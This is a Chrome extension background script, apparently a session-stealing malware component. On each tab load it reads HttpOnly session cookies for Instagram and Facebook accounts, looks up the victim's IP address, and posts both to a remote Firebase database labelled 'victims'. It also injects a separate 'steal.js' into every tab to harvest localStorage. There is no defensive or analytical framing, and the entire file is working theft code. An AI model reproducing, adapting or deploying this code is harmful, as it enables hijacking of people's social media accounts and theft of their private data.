const DB_URL = 'https://sessionid-d86e2-default-rtdb.firebaseio.com/victims';

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org');
    return await res.text();
  } catch {
    return 'unknown';
  }
}

async function sendData(data, type, url) {
  const ip = await getIP();
  const payload = {
    app: url.includes('instagram') ? 'Instagram' : url.includes('whatsapp') ? 'WhatsApp' : 'Facebook',
    ip,
    url,
    timestamp: new Date().toISOString(),
    type,
    data
  };

  fetch(`${DB_URL}.json`, {
    method: 'POST',
    body: JSON.stringify(payload),
    headers: { 'Content-Type': 'application/json' }
  });
}

// STEAL HttpOnly sessionid FROM COOKIES
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete' || !tab.url) return;

  const url = tab.url;

  // Instagram sessionid
  if (url.includes('instagram.com')) {
    chrome.cookies.getAll({ domain: '.instagram.com' }, (cookies) => {
      const session = cookies.find(c => c.name === 'sessionid');
      if (session) {
        sendData({ sessionid: session.value }, 'instagram_sessionid', url);
      }
    });
  }

  // Facebook session (c_user, xs, fr, datr)
  if (url.includes('facebook.com')) {
    chrome.cookies.getAll({ domain: '.facebook.com' }, (cookies) => {
      const fbCookies = {};
      ['c_user', 'xs', 'fr', 'datr', 'sb'].forEach(name => {
        const cookie = cookies.find(c => c.name === name);
        if (cookie) fbCookies[name] = cookie.value;
      });
      if (Object.keys(fbCookies).length) {
        sendData(fbCookies, 'facebook_cookies', url);
      }
    });
  }

  // Inject steal.js for localStorage
  chrome.scripting.executeScript({
    target: { tabId },
    files: ['steal.js']
  });
});